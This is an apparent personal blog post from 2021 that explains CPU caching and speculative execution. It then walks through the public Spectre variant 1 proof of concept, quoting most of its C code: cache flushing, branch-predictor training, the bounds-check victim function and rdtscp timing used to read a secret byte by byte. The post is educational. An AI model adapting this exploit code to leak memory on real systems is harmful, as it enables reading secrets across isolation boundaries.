<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Spectre and Cache · SuperGate</title><meta name="description" content="Spectre and Cache - SuperGate"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/avator.jpg"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="SuperGate"><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="SuperGate" type="application/atom+xml">
</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/avator.jpg" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/aboutme/" target="_self" class="nav-list-link">ABOUTME</a></li><li class="nav-list-item"><a href="/friends/" target="_self" class="nav-list-link">FRIENDS</a></li><li class="nav-list-item"><a href="https://github.com/UESuperGate" target="_blank" class="nav-list-link">GITHUB</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Spectre and Cache</h1><div class="post-info">Feb 22, 2021</div><div class="post-content"><!-- toc -->

<ul>
<li><a href="#resources">Resources</a></li>
<li><a href="#cache">Cache</a></li>
<li><a href="#branch-prediction-and-speculative-execution">Branch Prediction and Speculative Execution</a></li>
<li><a href="#how-does-poc-work">How does PoC work?</a></li>
<li><a href="#postscript">Postscript</a></li>
</ul>
<!-- tocstop -->

<h1><span id="resources">Resources</span></h1><ul>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/161135.html">https://www.freebuf.com/column/161135.html</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-230310.htm#msg_header_h1_0">https://bbs.pediy.com/thread-230310.htm#msg_header_h1_0</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Eugnis/spectre-attack">https://github.com/Eugnis/spectre-attack</a></li>
</ul>
<h1><span id="cache">Cache</span></h1><p>We all know that it takes much time when CPU accessing memory considering CPU caculation speed. In order to reduce the large amount of time consumption caused by CPU access, <code>cache</code> arised. </p>
<p><strong>This article will not introduce the exact structure of memory, if you get interested in it, please refer to <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Cache_(computing)">this</a>.</strong></p>
<p>Let’s assume that our computer will do this operation:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmp = Array[x];</span><br></pre></td></tr></table></figure>
<p>CPU is trying to get <code>Array[x]</code> from cache first instead of memory, and here are two situations:</p>
<ol>
<li><code>Array[x]</code> is in the cache, so CPU gets its value.</li>
<li><code>Array[x]</code> is not in the cache, so CPU needs to access memory to get its value, which will cost more time.</li>
</ol>
<h1><span id="branch-prediction-and-speculative-execution">Branch Prediction and Speculative Execution</span></h1><p>Modern CPUs are multi-core and multi-threaded, that is, support parallel execution of instructions. Therefore, if there is a branch jump condition that is related to a data, but the cache does not hit the data and can only perform the memory fetch operation, the program will not serially block to wait for the end of the memory fetch to perform the branch jump, but will attempt to perform branch prediction and speculative execution. When the memory data read by the CPU comes back, the CPU then confirms according to the content of the data and the logic of the branch condition whether its speculative execution is valid, and if it is invalid, the calculation result is discarded and restored to the previous state. If effective, continue execution, which greatly improves the efficiency of the CPU.</p>
<p>But here is the thing: If the result of speculative execution is discarded, the code executed during speculative execution may still affect the CPU cache. When the CPU is restoring the state, the cache will not be restored, and the CPU will only restore the state of the related registers.</p>
<p>Let’s look at this demo:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a1_size and a2 are not in the cache</span></span><br><span class="line"><span class="keyword">if</span> (idx &lt; a1_size) &#123;</span><br><span class="line">    tmp = a2[a1[idx]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In the demo above, CPU knows that it is a conditional judgment, and because <code>a1_size</code> is not in the cache, CPU needs to access memory to get the value.</p>
<p>Then, CPU saves a checkpoint, and executes instructions behind speculatively, which means that CPU treats <code>idx</code> as a variable that is smaller than <code>a1_size</code>. If <code>idx</code> is large enough, it will cause OOB reading, and <code>a1[idx]</code> will be treated as an index of <code>a2</code> and CPU will access memory based on <code>a1[idx]</code>. Finally accessed data in <code>a2</code> will be submitted from the memory to the CPU cache.</p>
<p>When <code>a1_size</code> is read from the memory, the CPU checks the branch condition again, and it finds that it does not meet the condition and cannot continue execution. So it will discard the current calculation result, then restore to the previous state, and continue to execute the code of another branch. But the data in <code>a2</code> has been submitted to the CPU cache.</p>
<p>The demo may be a little bit different from real <a target="_blank" rel="noopener" href="https://github.com/Eugnis/spectre-attack">PoC</a>, but it’s easier for us to understand.</p>
<h1><span id="how-does-poc-work">How does PoC work?</span></h1><p>The content we want to leak is defined:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* secret = <span class="string">&quot;The Magic Words are Squeamish Ossifrage.&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><code>malicious_x</code> is the shift of <code>secret</code> relative to <code>array1</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> malicious_x = (<span class="keyword">size_t</span>)(secret - (<span class="keyword">char</span> *)array1); <span class="comment">/* default for malicious_x */</span></span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> score[<span class="number">2</span>], len = <span class="built_in">strlen</span>(secret);</span><br><span class="line"><span class="keyword">uint8_t</span> value[<span class="number">2</span>];</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>value[0]</code> stores the character with the highest hit (the most likely character)</p>
</li>
<li><p><code>value[1]</code> stores the character with the second highest hit</p>
</li>
<li><p><code>score[0]</code> stores the number of hits with the highest character</p>
</li>
<li><p><code>score[1]</code> stores the number of hits for the second highest character</p>
</li>
</ul>
<p>Guess the data byte by byte:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (--len &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Reading at malicious_x = %p... &quot;</span>, (<span class="keyword">void</span> *)malicious_x);</span><br><span class="line">	readMemoryByte(malicious_x++, value, score);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s: &quot;</span>, (score[<span class="number">0</span>] &gt;= <span class="number">2</span> * score[<span class="number">1</span>] ? <span class="string">&quot;Success&quot;</span> : <span class="string">&quot;Unclear&quot;</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;0x%02X=&#x27;%c&#x27; score=%d &quot;</span>, value[<span class="number">0</span>],</span><br><span class="line">		       (value[<span class="number">0</span>] &gt; <span class="number">31</span> &amp;&amp; value[<span class="number">0</span>] &lt; <span class="number">127</span> ? value[<span class="number">0</span>] : <span class="string">&#x27;?&#x27;</span>), score[<span class="number">0</span>]);</span><br><span class="line">	<span class="keyword">if</span> (score[<span class="number">1</span>] &gt; <span class="number">0</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(second best: 0x%02X=&#x27;%c&#x27; score=%d)&quot;</span>, value[<span class="number">1</span>],</span><br><span class="line">				   (value[<span class="number">1</span>] &gt; <span class="number">31</span> &amp;&amp; value[<span class="number">1</span>] &lt; <span class="number">127</span> ? value[<span class="number">1</span>] : <span class="string">&#x27;?&#x27;</span>),</span><br><span class="line">				   score[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Let’s look inside <code>readMemoryByte</code> to see what happens.</p>
<p>In this function, we will try 1000 times to guess the answer, and break if the confidence condition is met:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (results[j] &gt;= (<span class="number">2</span> * results[k] + <span class="number">5</span>) || (results[j] == <span class="number">2</span> &amp;&amp; results[k] == <span class="number">0</span>))</span><br><span class="line">	<span class="keyword">break</span>; <span class="comment">/* Clear success if best is &gt; 2*runner-up + 5 or 2/0) */</span></span><br></pre></td></tr></table></figure>
<p>At the beginning, we need to flush <code>array2</code> from cache:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">	_mm_clflush(&amp;array2[i * <span class="number">512</span>]); <span class="comment">/* intrinsic for clflush instruction */</span></span><br></pre></td></tr></table></figure>
<p>Then there is another loop of 30 times. In this loop, it can be regarded as 5 6-cycles. The first 5 cycles are used to train the CPU, and then the conditional branch prediction is triggered for the last:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */</span></span><br><span class="line">training_x = tries % array1_size;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">29</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">	_mm_clflush(&amp;array1_size);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">volatile</span> <span class="keyword">int</span> z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125; <span class="comment">/* Delay (can also mfence) */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */</span></span><br><span class="line">	<span class="comment">/* Avoid jumps in case those tip off the branch predictor */</span></span><br><span class="line">	x = ((j % <span class="number">6</span>) - <span class="number">1</span>) &amp; ~<span class="number">0xFFFF</span>; <span class="comment">/* Set x=FFF.FF0000 if j%6==0, else x=0 */</span></span><br><span class="line">	x = (x | (x &gt;&gt; <span class="number">16</span>)); <span class="comment">/* Set x=-1 if j%6=0, else x=0 */</span></span><br><span class="line">	x = training_x ^ (x &amp; (malicious_x ^ training_x));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        j % 6 == 0 -&gt; x = malicious_x</span></span><br><span class="line"><span class="comment">        j % 6 != 0 -&gt; x = training_x</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Call the victim! */</span></span><br><span class="line">	victim_function(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>After these 30 cycles, through side-channel attacks, the access time of each item in <code>array2</code> is counted, and the ASCII value of the string is deduced:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Time reads. Order is lightly mixed up to prevent stride prediction */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	mix_i = ((i * <span class="number">167</span>) + <span class="number">13</span>) &amp; <span class="number">255</span>;</span><br><span class="line">	addr = &amp;array2[mix_i * <span class="number">512</span>];</span><br><span class="line">	time1 = __rdtscp(&amp;junk); <span class="comment">/* READ TIMER */</span></span><br><span class="line">	junk = *addr; <span class="comment">/* MEMORY ACCESS TO TIME */</span></span><br><span class="line">	time2 = __rdtscp(&amp;junk) - time1; <span class="comment">/* READ TIMER &amp; COMPUTE ELAPSED TIME */</span></span><br><span class="line">	<span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD &amp;&amp; mix_i != array1[tries % array1_size])</span><br><span class="line">		results[mix_i]++; <span class="comment">/* cache hit - add +1 to score for this value */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>At last, we need to find the highest and second highest results:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Locate highest &amp; second-highest results results tallies in j/k */</span></span><br><span class="line">j = k = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (j &lt; <span class="number">0</span> || results[i] &gt;= results[j])</span><br><span class="line">	&#123;</span><br><span class="line">		k = j;</span><br><span class="line">		j = i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (k &lt; <span class="number">0</span> || results[i] &gt;= results[k])</span><br><span class="line">	&#123;</span><br><span class="line">		k = i;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>As for <code>victim_function</code>, it’s similiar to the demo mentioned above:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> temp = <span class="number">0</span>; <span class="comment">/* Used so compiler won&#x27;t optimize out victim_function() */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">victim_function</span><span class="params">(<span class="keyword">size_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; array1_size) <span class="comment">// bound check</span></span><br><span class="line">	&#123;</span><br><span class="line">		temp &amp;= array2[array1[x] * <span class="number">512</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The first 5 cycles are essentially a kind of training for the CPU. Therefore, when the branch judgment of the sixth cycle causes speculative execution, the CPU is more inclined to choose the “no cross-border” branch, and therefore speculative execution. After the boundary check fails, the speculative execution result is discarded, but the value of <code>array2[array1[x] * 512]</code> has been stored in the cache. When reading the content of <code>array2[mix_t * 512]</code>, if you find that the reading time is abnormally fast, you can determine that <code>mix_t</code> is the answer.</p>
<h1><span id="postscript">Postscript</span></h1><p><code>CPU Spectre</code> is a novel cache-level attack method. However, this attack method also has its limitations, that is, the attacker needs to have a greater degree of freedom in the entire memory allocation and process control, and it is difficult to find such an exploit at the application level.</p>
</div></article></div></main><footer><div class="paginator"><a href="/2021/02/20/d3ctf%202021/d3ctf%202021/" class="next">NEXT</a></div><div class="copyright"><p>© 2021 <a href="http://example.com">SuperGate</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>